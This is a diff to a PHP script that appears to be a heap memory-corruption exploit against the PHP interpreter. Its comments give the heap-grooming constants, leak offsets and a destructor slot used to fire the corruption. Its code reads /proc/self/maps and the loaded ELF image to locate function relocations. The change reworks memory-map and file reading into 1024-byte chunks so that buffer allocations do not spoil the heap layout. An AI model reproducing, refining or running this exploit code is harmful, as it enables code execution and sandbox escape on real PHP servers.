@@ -30,10 +30,11 @@
 //   5. The existing R:1023 read still has to show \x7fELF at BASE+0 or we
 //      do not call.
 //
-// Heap: the resolver reads the ELF in 1024-byte chunks. A zend_string of
-// that size stays in the small bin (<=3072). No large-page run is freed
-// before the walk frees block2, so the 8160B (2-page) reclaim is unchanged.
-// The image buffer is gone before unset($arr).
+// Heap: fread size and the stream chunk size are both 1024. The default
+// stream buffer is 8192, which is the same 2-page class as the reclaim, so
+// chunk_size is dropped before the first read on the ELF and on
+// /proc/self/maps. Maps is parsed a line at a time, not file_get_contents.
+// Nothing in the resolver frees a 2-page run before the walk frees block2.
 //
 // pat length stays 2040. str_repeat($pat, 4) == 8160. Block2 = leak - 5056.
 // Spacing must be 128. FIRE dtor is still walk slot 19.
@@ -298,29 +299,49 @@ function find_zif_rela($fh, int $size, string $hdr, array $segs, array $vas): ?i
     return null;
 }
 
-function read_maps(): ?array {
-    $txt = @file_get_contents('/proc/self/maps');
-    if (!is_string($txt) || $txt === '') return null;
-    $vmas = [];
-    foreach (explode("\n", $txt) as $line) {
-        if ($line === '') continue;
-        if (!preg_match(
-            '/^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+([0-9a-f]+)\s+\S+\s+\d+\s*(.*)$/',
-            $line, $m
-        )) continue;
-        $start = hexdec($m[1]);
-        $end = hexdec($m[2]);
-        $off = hexdec($m[4]);
-        if (!is_int($start) || !is_int($end) || !is_int($off)) continue;
-        $path = rtrim($m[5], "\r");
-        if (str_ends_with($path, ' (deleted)')) {
-            $path = substr($path, 0, -strlen(' (deleted)'));
-        }
-        $vmas[] = [
-            'start' => $start, 'end' => $end, 'perms' => $m[3],
-            'off' => $off, 'path' => $path,
-        ];
+function parse_map_line(string $line, array &$vmas): void {
+    if ($line === '') return;
+    if (!preg_match(
+        '/^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+([0-9a-f]+)\s+\S+\s+\d+\s*(.*)$/',
+        $line, $m
+    )) return;
+    $start = hexdec($m[1]);
+    $end = hexdec($m[2]);
+    $off = hexdec($m[4]);
+    if (!is_int($start) || !is_int($end) || !is_int($off)) return;
+    $path = rtrim($m[5], "\r");
+    if (str_ends_with($path, ' (deleted)')) {
+        $path = substr($path, 0, -strlen(' (deleted)'));
     }
+    $vmas[] = [
+        'start' => $start, 'end' => $end, 'perms' => $m[3],
+        'off' => $off, 'path' => $path,
+    ];
+}
+
+function read_maps(): ?array {
+    $fh = @fopen('/proc/self/maps', 'rb');
+    if ($fh === false) return null;
+    stream_set_chunk_size($fh, 1024);
+    $vmas = [];
+    $prev = '';
+    while (true) {
+        $chunk = fread($fh, 1024);
+        if (!is_string($chunk) || $chunk === '') break;
+        $buf = $prev . $chunk;
+        $nl = strrpos($buf, "\n");
+        if ($nl === false) {
+            $prev = $buf;
+        } else {
+            foreach (explode("\n", substr($buf, 0, $nl)) as $line) {
+                parse_map_line($line, $vmas);
+            }
+            $prev = (string)substr($buf, $nl + 1);
+        }
+        if (strlen($chunk) < 1024) break;
+    }
+    if ($prev !== '') parse_map_line($prev, $vmas);
+    fclose($fh);
     return $vmas;
 }
 
@@ -346,6 +367,7 @@ function resolve_image(int $emptyAbs, bool $alsoRela = false): ?array {
     }
     $fh = fopen($path, 'rb');
     if ($fh === false) { echo "M2-BAIL cannot read $path\n"; return null; }
+    stream_set_chunk_size($fh, 1024);
     $size = filesize($path);
     $hdr = ($size !== false && $size >= 64) ? pread($fh, 0, 64) : null;
     $img = $hdr !== null ? parse_loads($fh, $hdr) : null;
